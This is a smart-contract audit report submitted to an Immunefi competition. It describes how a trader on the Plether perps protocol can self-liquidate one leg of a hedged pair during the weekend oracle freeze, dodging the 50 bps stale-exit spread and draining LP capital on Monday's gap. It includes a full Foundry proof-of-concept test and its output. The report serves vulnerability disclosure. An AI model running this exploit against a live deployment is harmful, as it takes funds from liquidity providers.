# \#99826 [SC-Medium] A trader can exit a weekend position at Friday's frozen price by liquidating it himself, skipping the 50 bps frozen-close spread, and take Monday's gap out of LP capital

**Submitted on Nov 15th 2026 at 12:31:15 UTC by @Afriauditor for [Audit Competition | Plether](https://immunefi.com/audit-competition/plether)**

- **Report ID:** #99826
- **Report Type:** Smart Contract
- **Report severity:** Medium
- **Target:** https://github.com/immunefi-team/audit-comp-plether/tree/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src
- **Impacts:**
  - Direct theft of any user funds, whether at-rest or in-motion, other than unclaimed yield

## Description



## Summary

While the oracle is frozen over the weekend, a voluntary close pays a fixed 50 bps spread to LPs. That spread is how the protocol prices an exit at a stale price. A liquidation at the same frozen price pays no spread and no execution fee. The trader can also act as the keeper and take back half the liquidation charge.

So a trader holds a matched long/short pair (two accounts) into the freeze, each leg just above the 3% weekend (FAD) margin. Once the weekend news shows which way Monday will open, he lets carry push the losing leg under the line and liquidates it himself for about 7 bps instead of 54 bps. He tops up the winning leg with `addMargin` and collects Monday's gap from the pool.

In the PoC the pair breaks even at about a 21 bps gap. That is below the whitepaper's 24.61 bps median Friday-to-Monday move, so LPs lose principal, not just the spread they were meant to earn.

## Description

The frozen-close spread is documented as the LP payment for leaving at a stale price. The whitepaper table at `WHITEPAPER.md:814` lists "Frozen close spread | Compensate LPs for voluntary stale-mark exit". The spread is only charged on voluntary closes, and the whitepaper states that "Liquidations never assess this spread" (`WHITEPAPER.md:1304`). A frozen liquidation is just as much a stale exit, and the trader can trigger it whenever he chooses:

1. **Same stale price, far cheaper.** In frozen mode, `PletherOracle._frozenBasket` (`PletherOracle.sol:729-742`) reuses `engine.lastMarkPrice()`. It builds a confidence of `price * basketMaxConfidenceRatioBps / 10_000` (10 bps), and the liquidation shift is 20% of that (`adverseConfidenceMultiplierBps = 2000`), or 2 bps. `LiquidationAccountingLib.buildLiquidationState` (lines 65-79) charges `bountyBps` = 10 bps of notional and sends `keeperShareBps` = 50% of it to the keeper. Liquidation charges no execution fee and no new VPI on exit (`CfdEnginePlanLib.planLiquidation`, line 1424 onward). A voluntary frozen close instead pays `frozenCloseSpreadBps` = 50 plus `executionFeeBps` = 4 (`PletherOracle.sol:934-939`, `CfdEngine.sol:147`).

2. **The trader can be the keeper.** `executeLiquidation` is permissionless and pays the keeper share to `msg.sender` (`OrderLiquidationBatchLogic.sol:706-728`). His own address gets 5 bps back, so the exit costs 10 − 5 + 2 = **7 bps**, against 50 + 4 = **54 bps** for a voluntary frozen close.

3. **The trader picks when it becomes liquidatable.** Price cannot move during the freeze, but carry keeps accruing. Liquidation uses `fadMarginBps` (3%) throughout the FAD window. A leg parked just above 3% equity crosses the line on carry alone. The PoC position accrues about 15.6 USDG of carry between Saturday noon and Sunday evening, so the trader controls the timing almost exactly.

4. **The other leg is protected cheaply.** `CfdEngine.addMargin` (`CfdEngine.sol:501-527`) has no frozen-mode gate. One call keeps the winning leg above the line, so the trader decides which leg exits after the weekend news is known.

5. **Two accounts give a flat pair.** Each account holds one position on one side (`_positions[account]`). Two accounts give a matched long and short with no net price exposure going into the freeze.

On Monday the pool pays the remaining leg its full gap profit. The offsetting loss would have come from the other leg, but that leg left at Friday's price for 7 bps, so the pool never receives it.

## Impact

LPs lose capital, not just fee income. Measured with the release risk parameters from `script/DeployPerpsArbitrumSepolia.s.sol` (maint 10 bps, init 20 bps, FAD 300 bps, liquidation charge 10 bps, keeper share 50%, frozen spread 50 bps), a 1M USDG pool, and two 300,000 USDG legs:

| Path | Losing-leg exit cost | Attacker P&L at a 100 bps gap | LP P&L at a 100 bps gap | Breakeven gap |
|---|---|---|---|---|
| Hold both legs to Monday (control) | – | −1,427.72 USDG | **+950.12 USDG** | never (flat on price) |
| Voluntary frozen close of losing leg | 1,620.19 USDG (54 bps) | +973.03 USDG | −1,333.03 USDG | ~68 bps |
| **Self-liquidation of losing leg** | **209.97 USDG (7 bps)** | **+2,368.11 USDG** | **−2,608.11 USDG** | **~21 bps** |

Gap sweep for the self-liquidation path (attacker P&L / LP P&L, in USDG):

| Monday gap | Attacker | LPs |
|---|---|---|
| 0 bps | −624.16 | +384.16 |
| 10 bps | −324.93 | +84.93 |
| 20 bps | −25.71 | −214.29 |
| 25 bps | +123.90 | −363.90 |
| 30 bps | +273.51 | −513.51 |
| 50 bps | +871.97 | −1,111.97 |
| 100 bps | +2,368.11 | −2,608.11 |

The intended stale-exit price makes this trade pay only on large gaps (about 68 bps, near the 90.33 bps 95th percentile). The liquidation route pushes breakeven down to about 21 bps, below the 24.61 bps median Friday-to-Monday move (`WHITEPAPER.md:1411`). The trader only has to wait for weekends where the news already points one way.

- The skipped spread alone takes about 47 bps of notional per exit away from LPs (and the 4 bps execution fee away from the treasury).
- Beyond that, LP equity goes negative whenever the gap passes about 21 bps.
- It needs no privileged role, only the regular weekend freeze, and it repeats every weekend.
- The trader can decline at the cost of one `addMargin` call.
- Size is limited only by the skew cap and pool depth.
- If a third-party keeper liquidates first, the trader loses the 5 bps rebate and the exit costs 12 bps. It is still far cheaper than 54 bps.



## Proof of Concept

## Proof of Concept


File: `packages/perps/test/perps/regression/WeekendSelfLiquidationStaleExit.t.sol`

Run:

```bash
forge test --root packages/perps --match-path test/perps/regression/WeekendSelfLiquidationStaleExit.t.sol -vv
```

The test uses the production `OrderRouter`, `PletherOracle`, `CfdEngine` and `HousePool` with the release risk parameters. Steps:

1. **Friday 20:00 UTC (live, before FAD):** account A opens LONG and account B opens SHORT, 300k notional each, with margin calibrated so B is above 3% on Saturday and below it on Sunday.
2. **Saturday noon (frozen):** `executeLiquidation(B)` reverts because B is healthy. A calls `addMargin(A, 3,000)`.
3. **Sunday 20:30 UTC (still frozen):** carry has pushed B under the line. The attacker's keeper address calls `executeLiquidation(B)`. B exits at Friday's mark for 209.97 USDG (7 bps). It also gives back its open-time VPI rebate of 448.90 USDG, which the voluntary path gives back too.
4. **Monday:** the basket opens 1% lower (LONG gains). A closes. The attacker nets +2,368.11 USDG and the pool loses 2,608.11 USDG.

Other tests in the same file:
- `test_Comparison_VoluntaryFrozenCloseCost` shows the intended exit costs 54 bps.
- `test_Control_HoldBothLegs` shows LPs gaining when both legs settle at the same price.
- `test_GapSweep` gives the breakeven at about 21 bps.

Output:

```
[PASS] test_PoC_SelfLiquidationStaleExit_DrainsLpOnWeekendGap()
    open-time VPI rebate clawed back (USDG, 6 dec): 448900596
    exit cost excl. carry and rebate clawback (USDG, 6 dec): 209970000
  Losing-leg exit cost via self-liquidation (bps of notional): 7
  Attacker net P&L (USD, 6 dec): 2368112121
  LP pool P&L (USD, 6 dec): -2608112121

[PASS] test_Comparison_VoluntaryFrozenCloseCost()
    exit cost excl. carry and rebate clawback (USDG, 6 dec): 1620194185
  Losing-leg exit cost via voluntary frozen close (bps of notional): 54
  Voluntary path attacker P&L: 973031944
  Voluntary path LP P&L: -1333031944

[PASS] test_Control_HoldBothLegs()
  Hold-both attacker P&L: -1427716291
  Hold-both LP P&L: 950116291

[PASS] test_GapSweep()
  gap 20 bps  attacker: -25710442   LP: -214289558
  gap 25 bps  attacker: 123901785   LP: -363901785
```

```solidity
// SPDX-License-Identifier: AGPL-3.0
pragma solidity 0.8.35;

import {BasePerpTest} from "../BasePerpTest.sol";
import {MockSettlementToken} from "../../utils/MockSettlementToken.sol";
import {IERC20} from "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import {CfdEngineAccountLens} from "@plether/perps/CfdEngineAccountLens.sol";
import {CfdEngineLens} from "@plether/perps/CfdEngineLens.sol";
import {CfdTypes} from "@plether/perps/CfdTypes.sol";
import {HousePool} from "@plether/perps/HousePool.sol";
import {HousePoolRedemptionMathSidecar} from "@plether/perps/HousePoolRedemptionMathSidecar.sol";
import {MarginClearinghouse} from "@plether/perps/MarginClearinghouse.sol";
import {PletherOracle} from "@plether/perps/PletherOracle.sol";
import {TerminalNavBookV2} from "@plether/perps/TerminalNavBookV2.sol";
import {TrancheVault} from "@plether/perps/TrancheVault.sol";
import {AccountLensViewTypes} from "@plether/perps/interfaces/AccountLensViewTypes.sol";
import {MockPyth} from "@plether/test-utils/MockPyth.sol";
import {console2} from "forge-std/console2.sol";

/// @notice PoC: a matched two-account pair held into the weekend oracle freeze lets the losing leg leave at Friday's
///         frozen mark through self-liquidation (~7 bps) instead of the 50 bps frozen-close spread, while the other
///         leg collects Monday's gap from LPs.
contract WeekendSelfLiquidationStaleExitTest is BasePerpTest {

    MockPyth mockPyth;
    bytes32[] feedIds;
    uint256[] weights;
    uint256[] bases;

    address lp = address(0xB0B);
    address legLong = address(0xA11CE); // attacker account A
    address legShort = address(0xB0BB1E); // attacker account B
    address keeper = address(0xC0FFEE); // attacker-controlled keeper EOA

    // Friday 2026-03-06 (EST): FAD starts 21:30 UTC, oracle frozen from 22:00 UTC.
    // Sunday 2026-03-08 (EDT after DST): oracle unfreezes at 21:00 UTC.
    uint256 constant FRIDAY_18UTC = 1_772_820_000;
    uint256 constant FRIDAY_20UTC = FRIDAY_18UTC + 2 hours;
    uint256 constant SATURDAY_NOON = 1_772_884_800;
    uint256 constant SUNDAY_2030UTC = 1_773_003_600 - 30 minutes;
    uint256 constant MONDAY_NOON = 1_773_057_600;

    uint256 constant PRICE = 1e8;
    uint256 constant SIZE = 300_000e18; // $300k notional per leg
    uint256 constant NOTIONAL = 300_000e6;
    uint256 constant TRADER_DEPOSIT = 30_000e6;
    uint256 constant WINNER_TOP_UP = 3000e6; // 1% of notional

    uint256 attackerValueStart;
    uint256 poolAssetsStart;

    /// @dev Release risk parameters from script/DeployPerpsArbitrumSepolia.s.sol.
    function _riskParams() internal pure override returns (CfdTypes.RiskParams memory) {
        return CfdTypes.RiskParams({
            vpiFactor: 0.01e18,
            maxSkewRatio: 0.4e18,
            maintMarginBps: 10,
            initMarginBps: 20,
            fadMarginBps: 300,
            baseCarryBps: 500,
            minBountyAssets: 1e6,
            bountyBps: 10,
            keeperShareBps: 5000,
            protocolShareBps: 0
        });
    }

    function setUp() public override {
        settlementToken = new MockSettlementToken();
        mockPyth = new MockPyth();
        mockPyth.setSynchronizeLegacyUniquePrices(true);

        clearinghouse = new MarginClearinghouse(address(settlementToken));
        engine = _deployEngine(_riskParams());
        _syncEngineAdmin();
        engine.setTerminalNavBook(address(new TerminalNavBookV2(address(engine), uint32(engine.CAP_PRICE()))));
        pool = new HousePool(address(settlementToken), address(engine), address(new HousePoolRedemptionMathSidecar()));
        seniorVault = new TrancheVault(
            IERC20(address(settlementToken)), address(pool), true, "Plether Senior LP", "seniorAssets", 0, address(0)
        );
        juniorVault = new TrancheVault(
            IERC20(address(settlementToken)), address(pool), false, "Plether Junior LP", "juniorAssets", 0, address(0)
        );
        pool.setSeniorVault(address(seniorVault));
        pool.setJuniorVault(address(juniorVault));
        engine.setPool(address(pool));

        feedIds.push(bytes32(uint256(1)));
        feedIds.push(bytes32(uint256(2)));
        weights.push(0.5e18);
        weights.push(0.5e18);
        bases.push(1e8);
        bases.push(1e8);

        engineLens = new CfdEngineLens(address(engine));
        engineAccountLens = new CfdEngineAccountLens(address(engine));
        pletherOracle =
            new PletherOracle(address(engine), address(pool), address(mockPyth), feedIds, weights, bases, new bool[](2));
        router = _deployLegacyOrderRouter(address(engine), address(engineLens), address(pool), address(pletherOracle));
        _syncRouterAdmin();
        engine.setOrderRouter(address(router));

        _bypassAllTimelocks();
        _bootstrapSeededLifecycle();
        _fundJunior(lp, 1_000_000e6);

        _fundTrader(legLong, TRADER_DEPOSIT);
        _fundTrader(legShort, TRADER_DEPOSIT);

        // Live Friday mark before the weekend.
        vm.warp(FRIDAY_18UTC);
        mockPyth.setAllPrices(feedIds, int64(int256(PRICE)), int32(-8), FRIDAY_18UTC + 6);
        vm.warp(FRIDAY_18UTC + 6);
        router.updateMarkPrice(_livePayload(int64(int256(PRICE)), uint64(FRIDAY_18UTC + 6), uint64(FRIDAY_18UTC)));

        attackerValueStart = _attackerValue();
        poolAssetsStart = pool.totalAssets();
    }

    // ------------------------------------------------------------------
    // Main PoC
    // ------------------------------------------------------------------

    function test_PoC_SelfLiquidationStaleExit_DrainsLpOnWeekendGap() public {
        uint256 margin = _calibratedMargin();
        _openPair(margin);

        // Saturday: both legs are healthy at the frozen mark; the trader learns the basket will open lower (LONG wins).
        vm.warp(SATURDAY_NOON);
        assertTrue(engine.isOracleFrozen(), "oracle frozen");
        assertTrue(engine.isFadWindow(), "FAD margin active");
        assertFalse(_ledger(legShort).liquidatable, "short leg healthy going into the weekend");
        vm.prank(keeper);
        vm.expectRevert();
        router.executeLiquidation(legShort, _upd());

        // Keep the winning leg safe.
        vm.prank(legLong);
        engine.addMargin(legLong, WINNER_TOP_UP);

        // Sunday: carry alone has pushed the losing leg under the 3% line. The trader liquidates it himself.
        vm.warp(SUNDAY_2030UTC);
        assertTrue(engine.isOracleFrozen(), "still frozen");
        // The cached-mark lens is unshifted; the router liquidates at the SHORT-adverse frozen price (mark - 2 bps).

        uint256 exitCostBps = _selfLiquidationExitCostBps();
        console2.log("Losing-leg exit cost via self-liquidation (bps of notional):", exitCostBps);
        assertLe(exitCostBps, 8, "losing leg leaves for ~7 bps");

        // Monday: the basket gaps -1% (LONG gains); the remaining leg is paid by the pool.
        (int256 attackerPnl, int256 lpPnl) = _closeWinnerMonday(100);
        console2.log("Attacker net P&L (USD, 6 dec):");
        console2.logInt(attackerPnl);
        console2.log("LP pool P&L (USD, 6 dec):");
        console2.logInt(lpPnl);

        assertGt(attackerPnl, 0, "attacker profits from a flat-on-price pair");
        assertLt(lpPnl, 0, "LP capital is lost, not just foregone spread");
    }

    /// @notice Same pair, but the losing leg pays the intended voluntary frozen exit.
    function test_Comparison_VoluntaryFrozenCloseCost() public {
        uint256 margin = _calibratedMargin();
        _openPair(margin);

        vm.warp(SATURDAY_NOON);
        vm.prank(legLong);
        engine.addMargin(legLong, WINNER_TOP_UP);

        uint256 costBps = _voluntaryFrozenCloseExitCostBps();
        console2.log("Losing-leg exit cost via voluntary frozen close (bps of notional):", costBps);
        assertGe(costBps, 50, "voluntary frozen exit pays the 50 bps LP spread");

        (int256 attackerPnl, int256 lpPnl) = _closeWinnerMonday(100);
        console2.log("Voluntary path attacker P&L:");
        console2.logInt(attackerPnl);
        console2.log("Voluntary path LP P&L:");
        console2.logInt(lpPnl);
    }

    /// @notice Breakeven sweep: attacker and LP P&L for several Monday gaps.
    function test_GapSweep() public {
        uint256 margin = _calibratedMargin();
        _openPair(margin);
        vm.warp(SATURDAY_NOON);
        vm.prank(legLong);
        engine.addMargin(legLong, WINNER_TOP_UP);
        vm.warp(SUNDAY_2030UTC);
        vm.prank(keeper);
        router.executeLiquidation(legShort, _upd());

        uint256[7] memory gaps = [uint256(0), 10, 20, 25, 30, 50, 100];
        for (uint256 i; i < gaps.length; ++i) {
            uint256 snap = vm.snapshotState();
            (int256 attackerPnl, int256 lpPnl) = _closeWinnerMonday(gaps[i]);
            console2.log("gap bps:", gaps[i]);
            console2.log("  attacker P&L:");
            console2.logInt(attackerPnl);
            console2.log("  LP P&L:");
            console2.logInt(lpPnl);
            vm.revertToState(snap);
        }
    }

    /// @notice Control: holding both legs to Monday is flat on price, so LPs only earn fees.
    function test_Control_HoldBothLegs() public {
        uint256 margin = _calibratedMargin();
        _openPair(margin);
        vm.warp(SATURDAY_NOON);
        vm.prank(legLong);
        engine.addMargin(legLong, WINNER_TOP_UP);
        vm.prank(legShort);
        engine.addMargin(legShort, WINNER_TOP_UP);

        vm.warp(MONDAY_NOON);
        uint256 gapped = PRICE - PRICE / 100;
        mockPyth.setAllPrices(feedIds, int64(int256(gapped)), int32(-8), MONDAY_NOON + 6);
        uint64 idL = router.nextCommitId();
        vm.prank(legLong);
        router.commitOrder(CfdTypes.Side.LONG, SIZE, 0, 0, true);
        uint64 idS = router.nextCommitId();
        vm.prank(legShort);
        router.commitOrder(CfdTypes.Side.SHORT, SIZE, 0, 0, true);
        vm.warp(MONDAY_NOON + 50);
        vm.roll(block.number + 1);
        vm.prank(keeper);
        router.executeOrder(idL, _upd());
        vm.prank(keeper);
        router.executeOrder(idS, _upd());

        int256 attackerPnl = int256(_attackerValue()) - int256(attackerValueStart);
        int256 lpPnl = int256(pool.totalAssets()) - int256(poolAssetsStart);
        console2.log("Hold-both attacker P&L:");
        console2.logInt(attackerPnl);
        console2.log("Hold-both LP P&L:");
        console2.logInt(lpPnl);
        assertLt(attackerPnl, 0, "a held pair only pays costs");
        assertGt(lpPnl, 0, "LPs earn when both legs settle at the same price");
    }

    // ------------------------------------------------------------------
    // Helpers
    // ------------------------------------------------------------------

    function _openPair(
        uint256 marginPerLeg
    ) internal {
        vm.warp(FRIDAY_20UTC);
        assertFalse(engine.isFadWindow(), "opens happen before the FAD window");
        mockPyth.setAllPrices(feedIds, int64(int256(PRICE)), int32(-8), FRIDAY_20UTC + 6);
        uint64 idL = router.nextCommitId();
        vm.prank(legLong);
        router.commitOrder(CfdTypes.Side.LONG, SIZE, marginPerLeg, 0, false);
        uint64 idS = router.nextCommitId();
        vm.prank(legShort);
        router.commitOrder(CfdTypes.Side.SHORT, SIZE, marginPerLeg, 0, false);
        vm.warp(FRIDAY_20UTC + 50);
        vm.roll(block.number + 1);
        vm.prank(keeper);
        router.executeOrder(idL, _upd());
        vm.prank(keeper);
        router.executeOrder(idS, _upd());
        (uint256 sL,,,,,,) = engine.positions(legLong);
        (uint256 sS,,,,,,) = engine.positions(legShort);
        require(sL == SIZE && sS == SIZE, "pair not opened");
    }

    /// @dev Chooses a per-leg margin that is above the 3% FAD line on Saturday and below it on Sunday from carry only.
    function _calibratedMargin() internal returns (uint256) {
        uint256 m0 = (NOTIONAL * 320) / 10_000;
        uint256 snap = vm.snapshotState();
        _openPair(m0);
        vm.warp(SATURDAY_NOON);
        int256 eSat = _ledger(legShort).netEquityAssets;
        vm.prank(legLong);
        engine.addMargin(legLong, WINNER_TOP_UP);
        vm.warp(SUNDAY_2030UTC);
        int256 eSun = _ledger(legShort).netEquityAssets;
        vm.revertToState(snap);

        // Frozen SHORT liquidation price = mark - 2 bps (10 bps max confidence * 20% adverse multiplier).
        uint256 liqNotional = (NOTIONAL * 9998) / 10_000;
        int256 target = int256((liqNotional * 300) / 10_000 + (NOTIONAL - liqNotional));
        int256 mid = (eSat + eSun) / 2;
        console2.log("calib eSat/eSun/target:");
        console2.logInt(eSat);
        console2.logInt(eSun);
        console2.logInt(target);
        return uint256(int256(m0) - (mid - target));
    }

    function _selfLiquidationExitCostBps() internal returns (uint256) {
        (,,,,,, int256 vpiAccrued) = engine.positions(legShort);
        uint256 openRebate = vpiAccrued < 0 ? uint256(-vpiAccrued) : 0;
        AccountLensViewTypes.AccountLedgerSnapshot memory s = _ledger(legShort);
        uint256 projectedCarry = s.margin - uint256(s.netEquityAssets + 0); // pnl at frozen mark is zero
        uint256 before = _value(legShort) + _value(keeper);
        vm.prank(keeper);
        router.executeLiquidation(legShort, _upd());
        (uint256 size,,,,,,) = engine.positions(legShort);
        assertEq(size, 0, "short leg liquidated at Friday's frozen mark");
        uint256 afterV = _value(legShort) + _value(keeper);
        uint256 cost = before - afterV - projectedCarry - openRebate;
        console2.log("  open-time VPI rebate clawed back (USDG, 6 dec):", openRebate);
        console2.log("  exit cost excl. carry and rebate clawback (USDG, 6 dec):", cost);
        return (cost * 10_000 + NOTIONAL / 2) / NOTIONAL;
    }

    function _voluntaryFrozenCloseExitCostBps() internal returns (uint256) {
        (,,,,,, int256 vpiAccrued) = engine.positions(legShort);
        uint256 openRebate = vpiAccrued < 0 ? uint256(-vpiAccrued) : 0;
        AccountLensViewTypes.AccountLedgerSnapshot memory s = _ledger(legShort);
        uint256 before = _value(legShort) + _value(keeper);
        uint64 id = router.nextCommitId();
        vm.prank(legShort);
        router.commitOrder(CfdTypes.Side.SHORT, SIZE, 0, 0, true);
        vm.warp(block.timestamp + 50);
        vm.roll(block.number + 1);
        // Carry accrued over the 50 s wait is negligible; take the projection just before execution.
        uint256 projectedCarry = s.margin - uint256(_ledger(legShort).netEquityAssets);
        vm.prank(keeper);
        router.executeOrder(id, _upd());
        (uint256 size,,,,,,) = engine.positions(legShort);
        assertEq(size, 0, "short leg closed voluntarily during freeze");
        uint256 afterV = _value(legShort) + _value(keeper);
        uint256 cost = before - afterV - projectedCarry - openRebate;
        console2.log("  open-time VPI rebate clawed back (USDG, 6 dec):", openRebate);
        console2.log("  exit cost excl. carry and rebate clawback (USDG, 6 dec):", cost);
        return (cost * 10_000 + NOTIONAL / 2) / NOTIONAL;
    }

    function _closeWinnerMonday(
        uint256 gapBps
    ) internal returns (int256 attackerPnl, int256 lpPnl) {
        vm.warp(MONDAY_NOON);
        assertFalse(engine.isOracleFrozen(), "oracle live again");
        uint256 gapped = PRICE - (PRICE * gapBps) / 10_000;
        mockPyth.setAllPrices(feedIds, int64(int256(gapped)), int32(-8), MONDAY_NOON + 6);
        uint64 id = router.nextCommitId();
        vm.prank(legLong);
        router.commitOrder(CfdTypes.Side.LONG, SIZE, 0, 0, true);
        vm.warp(MONDAY_NOON + 50);
        vm.roll(block.number + 1);
        vm.prank(keeper);
        router.executeOrder(id, _upd());
        (uint256 size,,,,,,) = engine.positions(legLong);
        assertEq(size, 0, "winner closed");

        attackerPnl = int256(_attackerValue()) - int256(attackerValueStart);
        lpPnl = int256(pool.totalAssets()) - int256(poolAssetsStart);
    }

    function _ledger(
        address account
    ) internal view returns (AccountLensViewTypes.AccountLedgerSnapshot memory) {
        return engineAccountLens.getAccountLedgerSnapshot(account);
    }

    function _value(
        address account
    ) internal view returns (uint256) {
        return clearinghouse.balanceAssets(account) + settlementToken.balanceOf(account)
            + engine.traderClaimBalanceAssets(account);
    }

    function _attackerValue() internal view returns (uint256) {
        return _value(legLong) + _value(legShort) + _value(keeper);
    }

    function _upd() internal pure returns (bytes[] memory d) {
        d = new bytes[](1);
        d[0] = "";
    }

    function _livePayload(
        int64 price,
        uint64 tick,
        uint64 previous
    ) internal view returns (bytes[] memory data) {
        MockPyth.FeedUpdate[] memory ticks = new MockPyth.FeedUpdate[](feedIds.length);
        for (uint256 i; i < feedIds.length; ++i) {
            ticks[i] = MockPyth.FeedUpdate(feedIds[i], MockPyth.MockPrice(price, 0, -8, tick, previous));
        }
        data = new bytes[](1);
        data[0] = abi.encode(ticks);
    }

}
```
